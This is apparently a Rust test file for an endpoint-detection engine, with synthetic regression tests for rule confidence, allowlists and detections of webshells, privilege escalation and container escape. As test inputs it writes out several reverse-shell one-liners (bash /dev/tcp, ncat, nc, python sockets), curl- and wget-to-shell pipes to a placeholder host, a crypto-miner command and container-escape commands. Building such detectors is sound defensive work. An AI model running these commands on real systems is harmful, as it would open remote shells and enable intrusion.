//! Synthetic regressions for the A1/A2 engine fixes (no customer data).
use detection::{Confidence, DetectionEngine, DetectionSignals, EventClass, TelemetryEvent};
use EventClass::*;

fn event(
    class: EventClass,
    pid: u32,
    ppid: u32,
    process: &str,
    parent: &str,
    cmd: &str,
) -> TelemetryEvent {
    TelemetryEvent {
        ts_unix: 100,
        event_class: class,
        pid,
        ppid,
        uid: 1000,
        process: process.into(),
        parent_process: parent.into(),
        session_id: 1,
        file_path: None,
        file_write: false,
        file_hash: None,
        dst_port: (class == NetworkConnect).then_some(4444),
        dst_ip: (class == NetworkConnect).then(|| "198.51.100.7".into()),
        dst_domain: None,
        command_line: Some(cmd.into()),
        event_size: None,
        container_runtime: None,
        container_id: None,
        container_escape: false,
        container_privileged: false,
    }
}

fn isolated() -> DetectionEngine {
    let mut engine = DetectionEngine::default_with_rules();
    engine.layer2 = detection::TemporalEngine::new();
    engine.layer4 = detection::Layer4Engine::new(300);
    engine
}

#[test]
fn feature_only_is_not_temporal_corroboration() {
    let mut engine = isolated();
    engine.layer1.load_string_features(["python3 -c".into()]);
    engine.load_sigma_rule_yaml("title: contextual_exec\nlevel: high\ndetection:\n  sequence:\n    - event_class: process_exec\n      process_any_of: [python3]\n      within_secs: 1\n").unwrap();
    let out = engine.process_event(&event(
        ProcessExec,
        100,
        10,
        "python3",
        "bash",
        "python3 -c 'print(1)'",
    ));
    assert!(out.layer1.prefilter_hit);
    assert!(out.layer1.matched_signatures.is_empty());
    assert_eq!(out.confidence, Confidence::High);
    let signal = DetectionSignals {
        z2_temporal: true,
        l1_prefilter_hit: true,
        ..Default::default()
    };
    assert_eq!(detection::confidence_policy(&signal), Confidence::High);
}

#[test]
fn sigma_level_is_honored_and_absent_level_defaults_high() {
    for (level, expected) in [
        ("level: low\n", Confidence::Low),
        ("level: medium\n", Confidence::Medium),
        ("level: informational\n", Confidence::None),
        ("", Confidence::High),
    ] {
        let mut engine = isolated();
        engine.load_sigma_rule_yaml(&format!("title: graded\n{level}detection:\n  sequence:\n    - event_class: process_exec\n      process_any_of: [fixture]\n      within_secs: 1\n")).unwrap();
        assert_eq!(
            engine
                .process_event(&event(ProcessExec, 100, 10, "fixture", "bash", "fixture"))
                .confidence,
            expected,
            "{level}"
        );
    }
}

#[test]
fn strong_l1_shapes_detect_without_temporal_and_are_exec_scoped() {
    for (process, cmd) in [
        ("bash", "bash -i >&/dev/tcp/198.51.100.7/443 0>&1"),
        ("ncat", "ncat 198.51.100.7 4444 -e /bin/bash"),
        ("nc.traditional", "nc 198.51.100.7 4444 -c /bin/sh"),
        ("python3", "python3 -c 'import socket,os;s=socket.socket();s.connect((host,443));os.dup2(s.fileno(),0);os.system(\"/bin/sh\")'"),
        ("python3.11", "python3 -c 'import socket,os;s=socket.socket();s.connect((host,443));os.dup2(s.fileno(),0);os.system(\"/bin/sh\")'"),
        ("xmrig", "xmrig -o stratum+ssl://pool.invalid:443"),
    ] {
        let mut engine = isolated();
        assert!(engine.process_event(&event(ProcessExec, 100, 10, process, "bash", cmd)).confidence >= Confidence::High, "{process}");
        let out = engine.process_event(&event(FileOpen, 101, 10, process, "bash", cmd));
        assert!(out.confidence < Confidence::High, "non-exec: {process}");
        assert!(!out.layer1.prefilter_hit, "non-exec text must not feed ML");
    }
}

#[test]
fn pipe_targets_have_token_boundaries_and_features_do_not_leak_on_file_events() {
    let mut engine = isolated();
    engine.layer1.load_string_features(["python3 -c".into()]);
    for target in ["sha256sum", "shuf", "bashful", "shasum"] {
        let out = engine.process_event(&event(
            ProcessExec,
            100,
            10,
            "sh",
            "make",
            &format!("sh -c 'curl https://download.invalid/x | {target}'"),
        ));
        assert!(
            !out.layer1
                .matched_signatures
                .iter()
                .any(|s| s == "download_pipe_shell"),
            "{target}"
        );
    }
    let good = engine.process_event(&event(
        ProcessExec,
        100,
        10,
        "sh",
        "bash",
        "sh -c 'wget -qO- https://download.invalid/x | /bin/bash'",
    ));
    assert!(good
        .layer1
        .matched_signatures
        .iter()
        .any(|s| s == "download_pipe_shell"));
    for class in [FileOpen, NetworkConnect, ProcessExit] {
        assert!(
            !engine
                .process_event(&event(
                    class,
                    200,
                    10,
                    "python3",
                    "cron",
                    "python3 -c 'print(1)'"
                ))
                .layer1
                .prefilter_hit
        );
    }
}

#[test]
fn reverse_shell_fork_and_webshell_descendant_have_causal_hits() {
    let mut engine = DetectionEngine::default_with_rules();
    let cmd = "bash -c 'bash -i >& /dev/tcp/198.51.100.7/443 0>&1'";
    engine.process_event(&event(ProcessExec, 100, 10, "bash", "bash", cmd));
    let mut callback = event(NetworkConnect, 101, 100, "bash", "bash", cmd);
    callback.dst_port = Some(443);
    assert!(engine
        .process_event(&callback)
        .temporal_hits
        .iter()
        .any(|h| h == "phi_reverse_shell"));

    let mut engine = DetectionEngine::default_with_rules();
    engine.process_event(&event(
        ProcessExec,
        200,
        20,
        "sh",
        "php-fpm8.3",
        "sh -c 'id; curl https://198.51.100.7/x | sh'",
    ));
    engine.process_event(&event(
        ProcessExec,
        201,
        200,
        "curl",
        "sh",
        "curl https://198.51.100.7/x",
    ));
    let callback = event(
        NetworkConnect,
        201,
        200,
        "curl",
        "sh",
        "curl https://198.51.100.7/x",
    );
    assert!(engine
        .process_event(&callback)
        .temporal_hits
        .iter()
        .any(|h| h == "phi_webshell"));
}

#[test]
fn loopback_callbacks_and_unrelated_host_session_do_not_alert() {
    for ip in ["127.0.0.1", "::1", "::ffff:127.0.0.1", "0.0.0.0", "::"] {
        let mut engine = DetectionEngine::default_with_rules();
        engine.process_event(&event(ProcessExec, 100, 10, "sh", "nginx", "sh -c psql"));
        let mut callback = event(NetworkConnect, 100, 10, "sh", "nginx", "sh -c psql");
        callback.dst_ip = Some(ip.into());
        assert!(
            engine.process_event(&callback).confidence < Confidence::High,
            "{ip}"
        );
    }
    let mut engine = DetectionEngine::default_with_rules();
    engine.process_event(&event(
        ProcessExec,
        100,
        1,
        "curl",
        "cron",
        "curl http://127.0.0.1/health",
    ));
    let out = engine.process_event(&event(ProcessExec, 200, 1, "sh", "cron", "sh"));
    assert!(
        out.temporal_hits.is_empty(),
        "PID 1 is not a pipeline parent"
    );
    assert!(out.confidence < Confidence::High);
}

#[test]
fn installer_pipeline_is_medium_in_either_order_even_after_downloader_exit() {
    for reverse in [false, true] {
        let mut engine = DetectionEngine::default_with_rules();
        let curl = event(
            ProcessExec,
            100,
            10,
            "curl",
            "bash",
            "curl -fsSL https://download.invalid/install",
        );
        let sh = event(ProcessExec, 101, 10, "sh", "bash", "sh");
        let events = if reverse {
            vec![sh, curl]
        } else {
            vec![
                curl,
                event(ProcessExit, 100, 10, "curl", "bash", "curl"),
                sh,
            ]
        };
        let mut maximum = Confidence::None;
        let mut hits = Vec::new();
        for e in events {
            let out = engine.process_event(&e);
            maximum = maximum.max(out.confidence);
            hits.extend(out.temporal_hits);
        }
        assert!(
            hits.iter().any(|h| h == "phi_download_pipe_shell"),
            "reverse={reverse}"
        );
        assert_eq!(maximum, Confidence::Medium, "reverse={reverse}");
    }
}

#[test]
fn windows_paths_are_separator_normalized() {
    let mut engine = isolated();
    engine.load_sigma_rule_yaml("title: windows_path\nlevel: high\ndetection:\n  sequence:\n    - event_class: file_open\n      file_path_contains: ['/windows/ntds/ntds.dit']\n      within_secs: 1\n").unwrap();
    let mut e = event(FileOpen, 100, 10, "cmd.exe", "cmd.exe", "copy");
    e.file_path =
        Some(r"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit".into());
    assert_eq!(engine.process_event(&e).confidence, Confidence::High);
}

#[test]
fn basename_allowlist_never_suppresses_ioc_and_path_prefixes_have_boundaries() {
    let mut engine = isolated();
    engine.layer1.load_hashes(["synthetic-sha256".into()]);
    engine
        .allowlist
        .load_from_lists(vec!["eguard-agent".into()], vec!["/opt/trusted".into()]);
    let mut e = event(ProcessExec, 100, 10, "eguard-agent", "bash", "eguard-agent");
    e.file_path = Some("/tmp/eguard-agent".into());
    e.file_hash = Some("synthetic-sha256".into());
    assert_eq!(engine.process_event(&e).confidence, Confidence::Definite);
    e.file_path = Some("/opt/trusted/agent".into());
    assert_eq!(engine.process_event(&e).confidence, Confidence::Definite);
    e.file_hash = None;
    e.file_path = Some("/opt/trustedevil/agent".into());
    assert!(!engine.allowlist.is_allowed(&e));
    e.file_path = Some("/opt/trusted/agent".into());
    assert!(engine.allowlist.is_allowed(&e));
    e.event_class = FileOpen;
    assert!(
        !engine.allowlist.is_allowed(&e),
        "an accessed file is not process identity"
    );
}

#[test]
fn exact_ioc_keeps_temporal_state_consistent() {
    let mut engine = DetectionEngine::default_with_rules();
    engine.layer1.load_hashes(["synthetic-sha256".into()]);
    let mut e = event(ProcessExec, 100, 10, "sh", "nginx", "sh -c id");
    e.file_hash = Some("synthetic-sha256".into());
    assert_eq!(engine.process_event(&e).confidence, Confidence::Definite);
    let out = engine.process_event(&event(NetworkConnect, 100, 10, "sh", "nginx", "sh -c id"));
    assert!(out.temporal_hits.iter().any(|h| h == "phi_webshell"));
}

#[test]
fn malformed_sigma_file_does_not_abort_directory_load() {
    let dir = tempfile::tempdir().unwrap();
    let yaml = "title: first_native\nlevel: high\nlogsource:\n  product: linux\n  category: process_creation\ndetection:\n  sequence:\n    - event_class: process_exec\n      process_any_of: [fixture]\n      within_secs: 1\n";
    std::fs::write(dir.path().join("00-native.yml"), yaml).unwrap();
    std::fs::write(dir.path().join("01-broken.yml"), "detection: [invalid").unwrap();
    std::fs::write(
        dir.path().join("99-valid.yml"),
        yaml.replace("first_native", "last_valid"),
    )
    .unwrap();
    let mut engine = isolated();
    assert_eq!(engine.load_sigma_rules_from_dir(dir.path()).unwrap(), 2);
    let hits = engine
        .process_event(&event(ProcessExec, 100, 10, "fixture", "bash", "fixture"))
        .temporal_hits;
    assert_eq!(hits, vec!["first_native", "last_valid"]);
}

#[test]
fn predicate_negations_and_all_groups_block_routine_activity() {
    // Excluded web-mail helpers must not become webshells on their SMTP callback.
    let mut engine = DetectionEngine::default_with_rules();
    engine.process_event(&event(
        ProcessExec,
        100,
        10,
        "sh",
        "apache2",
        "sh -c '/usr/sbin/sendmail -t -i'",
    ));
    let out = engine.process_event(&event(
        NetworkConnect,
        100,
        10,
        "sh",
        "apache2",
        "sh -c '/usr/sbin/sendmail -t -i'",
    ));
    assert!(out.temporal_hits.is_empty());
    // Download library use without an execute operation is not an inline payload.
    let mut engine = DetectionEngine::default_with_rules();
    assert!(engine
        .process_event(&event(
            ProcessExec,
            100,
            10,
            "python3",
            "bash",
            "python3 -c 'import urllib.request;print(urllib.request.urlopen(url).status)'",
        ))
        .temporal_hits
        .is_empty());
    let out = engine.process_event(&event(ProcessExec, 101, 10, "sh", "bash", "sh"));
    assert!(out.temporal_hits.is_empty());
    // A shell running a script is not a pipeline's stdin consumer, even with the same parent.
    let mut engine = DetectionEngine::default_with_rules();
    engine.process_event(&event(
        ProcessExec,
        100,
        10,
        "curl",
        "bash",
        "curl https://download.invalid/status",
    ));
    let out = engine.process_event(&event(
        ProcessExec,
        101,
        10,
        "sh",
        "bash",
        "sh /usr/local/bin/backup.sh",
    ));
    assert!(out.temporal_hits.is_empty());
    // Package-managed writes and editor scratch files cannot arm persistence activation.
    for (process, path) in [
        ("dpkg", "/etc/cron.d/package"),
        ("bash", "/home/u/.bashrc.swp"),
    ] {
        let mut engine = DetectionEngine::default_with_rules();
        let mut write = event(FileOpen, 100, 10, process, "bash", process);
        write.file_path = Some(path.into());
        write.file_write = true;
        assert!(engine.process_event(&write).temporal_hits.is_empty());
        let out = engine.process_event(&event(
            ProcessExec,
            101,
            10,
            "systemctl",
            "bash",
            "systemctl enable normal.service",
        ));
        assert!(out.temporal_hits.is_empty(), "{process}: {path}");
    }
}

#[test]
fn php_fpm_prefix_and_unbrokered_elevation_have_positive_controls() {
    let mut engine = DetectionEngine::default_with_rules();
    engine.process_event(&event(
        ProcessExec,
        100,
        10,
        "sh",
        "php-fpm8.4",
        "sh -c curl",
    ));
    let out = engine.process_event(&event(
        NetworkConnect,
        100,
        10,
        "sh",
        "php-fpm8.4",
        "sh -c curl",
    ));
    assert!(out.temporal_hits.iter().any(|h| h == "phi_webshell"));
    for (parent, expected) in [("sudo", false), ("pwnkit", true)] {
        let mut engine = DetectionEngine::default_with_rules();
        engine.process_event(&event(ProcessExec, 100, 10, parent, "bash", parent));
        let mut child = event(ProcessExec, 101, 100, "sh", parent, "sh");
        child.uid = 0;
        let out = engine.process_event(&child);
        assert_eq!(
            out.temporal_hits
                .iter()
                .any(|h| h == "phi_unbrokered_root_shell"),
            expected
        );
        if !expected {
            assert!(out.confidence < Confidence::High);
        }
    }
}

#[test]
fn killchain_exploit_and_container_predicates_need_actual_action_evidence() {
    for (process, cmd, path, write, image) in [
        ("bash", "bash", "/proc/4242/mem", false, "/memfd:payload"),
        ("bash", "bash", "/proc/self/maps", true, "/memfd:payload"),
        (
            "sysctl",
            "sysctl -w kernel.yama.ptrace_scope=1",
            "",
            false,
            "/memfd:payload",
        ),
        (
            "gdb",
            "gdb -p 4242",
            "",
            false,
            "/opt/google/chrome/chrome (deleted)",
        ),
        (
            "gdb",
            "gdb -p 4242",
            "",
            false,
            "/memfd:runc_cloned (deleted)",
        ),
    ] {
        let mut l4 = detection::Layer4Engine::with_default_templates();
        let mut parent = event(
            if path.is_empty() {
                ProcessExec
            } else {
                FileOpen
            },
            100,
            10,
            process,
            "bash",
            cmd,
        );
        parent.file_path = (!path.is_empty()).then(|| path.into());
        parent.file_write = write;
        l4.observe(&parent);
        let mut child = event(ProcessExec, 101, 100, "payload", process, "payload");
        child.ts_unix += 1;
        child.file_path = Some(image.into());
        assert!(
            l4.observe(&child).is_empty(),
            "{process}: {path} -> {image}"
        );
    }
    for (runtime, cmd, expected) in [
        ("host", "nsenter -t 1 -m -u -i -n sh", false),
        ("docker", "nsenter -t 10 -m sh", false),
        ("docker", "node_exporter --path.rootfs=/host", false),
        ("docker", "cat /sys/fs/cgroup/release_agent", false),
        ("docker", "cat /proc/sys/kernel/core_pattern", false),
        ("docker", "ls /proc/1/root", false),
        ("docker", "nsenter -t 1 -m -u -i -n sh", true),
        (
            "docker",
            "sh -c echo '|/tmp/x' > /proc/sys/kernel/core_pattern",
            true,
        ),
    ] {
        let mut l4 = detection::Layer4Engine::with_default_templates();
        let mut e = event(ProcessExec, 100, 10, "nsenter", "sh", cmd);
        e.container_runtime = Some(runtime.into());
        e.container_privileged = runtime != "host";
        let hits = l4.observe(&e);
        assert_eq!(
            hits.iter().any(|h| h == "killchain_container_escape"),
            expected,
            "{runtime}: {cmd}"
        );
    }
}

#[test]
fn intermediate_non_root_child_does_not_erase_elevation_parent() {
    let mut engine = DetectionEngine::default_with_rules();
    engine.process_event(&event(ProcessExec, 100, 10, "pwnkit", "bash", "./pwnkit"));
    engine.process_event(&event(
        ProcessExec,
        101,
        100,
        "cat",
        "pwnkit",
        "cat /proc/self/status",
    ));
    let mut root = event(ProcessExec, 102, 100, "sh", "pwnkit", "sh");
    root.uid = 0;
    assert!(engine
        .process_event(&root)
        .temporal_hits
        .iter()
        .any(|h| h == "phi_unbrokered_root_shell"));
}

#[test]
#[ignore = "RAFIX-INTEGRATION: needs AML generic pipe heuristic fix"]
fn installer_pipeline_unquoted_argv_has_no_high_or_wrapper_duplicate() {
    // /proc cmdline joining does not restore shell quoting around the -c argument.
    for (parent_cmd, downloader, download_cmd, shell) in [
        (
            "sh -c curl -fsSL https://download.invalid/install | sh",
            "curl",
            "curl -fsSL https://download.invalid/install",
            "sh",
        ),
        (
            "sh -c wget -qO- https://download.invalid/install | bash",
            "wget",
            "wget -qO- https://download.invalid/install",
            "bash",
        ),
    ] {
        let mut engine = DetectionEngine::default_with_rules();
        let parent = engine.process_event(&event(ProcessExec, 900, 10, "sh", "bash", parent_cmd));
        assert_eq!(
            parent.confidence,
            Confidence::None,
            "parent argv is context: {parent_cmd}; {:?}",
            parent.exploit_indicators
        );
        let download = engine.process_event(&event(
            ProcessExec,
            901,
            900,
            downloader,
            "sh",
            download_cmd,
        ));
        let shell = engine.process_event(&event(ProcessExec, 902, 900, shell, "sh", shell));
        let alerts: Vec<_> = [parent, download, shell]
            .into_iter()
            .filter(|o| o.confidence != Confidence::None)
            .collect();
        assert_eq!(alerts.len(), 1);
        assert_eq!(alerts[0].confidence, Confidence::Medium);
        assert_eq!(alerts[0].temporal_hits, vec!["phi_download_pipe_shell"]);
    }
}
